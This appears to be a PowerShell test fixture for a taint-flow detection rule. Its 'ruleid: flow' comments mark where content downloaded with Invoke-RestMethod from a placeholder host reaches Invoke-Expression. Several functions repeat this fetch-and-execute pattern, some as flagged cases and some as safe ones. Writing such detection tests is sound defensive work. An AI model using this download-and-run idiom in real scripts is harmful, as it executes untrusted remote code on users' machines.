function Invoke-Value {
  param([string]$Value, $Other = 'safe')
  # ruleid: flow
  Invoke-Expression $Value
}
Invoke-Value (Invoke-RestMethod 'https://example.test')
function Invoke-Named {
  param($Other, [string]$Value)
  # ruleid: flow
  Invoke-Expression $VALUE
}
Invoke-Named -vALUe (Invoke-RestMethod 'https://example.test') -Other 'safe'
function Invoke-Safe {
  param($Other, [string]$Value = 'safe')
  Invoke-Expression $Value
}
Invoke-Safe -Other (Invoke-RestMethod 'https://example.test') -Value 'safe'
Invoke-Safe -Other (Invoke-RestMethod 'https://example.test')
function Invoke-Overwritten {
  param($Value)
  $Value = 'safe'
  Invoke-Expression $Value
}
Invoke-Overwritten (Invoke-RestMethod 'https://example.test')
& {
  param($Value)
  # ruleid: flow
  Invoke-Expression $Value
} (Invoke-RestMethod 'https://example.test')
function Invoke-Later {
  param($Other, $Value)
  # ruleid: flow
  Invoke-Expression $Value
  Invoke-Expression $Other
}
Invoke-Later -Value (Invoke-RestMethod 'https://example.test')
function Invoke-Braced {
  param(${Value})
  # ruleid: flow
  Invoke-Expression $value
}
Invoke-Braced -Value (Invoke-RestMethod 'https://example.test')
